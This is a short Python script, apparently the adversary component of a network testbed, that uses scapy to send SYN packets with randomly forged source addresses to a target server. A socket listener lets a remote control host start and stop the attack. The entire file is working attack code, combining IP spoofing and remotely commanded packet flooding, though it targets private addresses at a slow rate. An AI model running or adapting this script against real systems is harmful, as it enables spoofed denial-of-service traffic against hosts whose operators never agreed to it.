# adversary.py
from scapy.all import IP, TCP, send
import socket
import threading
import random
import time

CONTROL_HOST = "10.10.0.1"
CONTROL_PORT = 9000
SERVER_IP = "10.10.0.2"
SERVER_PORT = 8080

running = False

def spoof_attack():
    while True:
        if running:
            spoof_ip = f"10.10.1.{random.randint(2,254)}"
            pkt = IP(src=spoof_ip, dst=SERVER_IP) / TCP(dport=SERVER_PORT, sport=random.randint(1024,65535), flags="S")
            send(pkt, verbose=False)
            print(f"[*] Sent spoofed packet from {spoof_ip}")
            time.sleep(1)
        else:
            time.sleep(1)

def listener():
    global running
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((CONTROL_HOST, CONTROL_PORT))
    while True:
        data = s.recv(1024).decode()
        if not data:
            break
        if data == "START":
            running = True
            print("[*] Adversary attack started")
        elif data == "STOP":
            running = False
            print("[*] Adversary attack stopped")

if __name__ == "__main__":
    threading.Thread(target=spoof_attack, daemon=True).start()
    listener()
